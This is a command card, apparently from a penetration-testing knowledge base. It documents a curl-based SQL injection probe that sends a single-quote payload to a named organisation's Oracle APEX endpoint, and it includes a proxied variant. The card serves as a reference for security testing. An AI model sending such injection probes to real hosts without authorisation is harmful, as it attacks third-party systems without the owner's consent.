---
data: 'curl "http://ipm.informatica.com/pls/apex/f?1''=1" -v'
tags:
  - sqli
  - detection
type: command
output: HTTP/1.1 500 Internal Server Error
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.743Z'
id: 74fcf752-d8f0-4b96-a946-e976ebfd8ad4
verified: false
validated: true
submitted: true
---
# sqli-detection-single-quote

## Command

```bash
curl "http://ipm.informatica.com/pls/apex/f?1'=1" -v
```

## Description

Sends an HTTP GET request with a single quote in the query parameter to test for SQL injection by triggering a syntax error in the backend Oracle query.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with injected parameter | Yes |
| -v | Verbose output for headers and status | No |

## Examples

### Basic Usage

```bash
curl "http://ipm.informatica.com/pls/apex/f?1'=1" -v
```

### Advanced Usage

```bash
curl -x http://proxy:8080 "http://ipm.informatica.com/pls/apex/f?1'=1" -v
```

## Expected Output

HTTP/1.1 500 Internal Server Error with possible SQL error in body, indicating injection.

## Related

- [[commands/sqli-detection-double-quote]]
- [[procedures/SQL-Injection-Detection-via-Error-Based-Testing]]
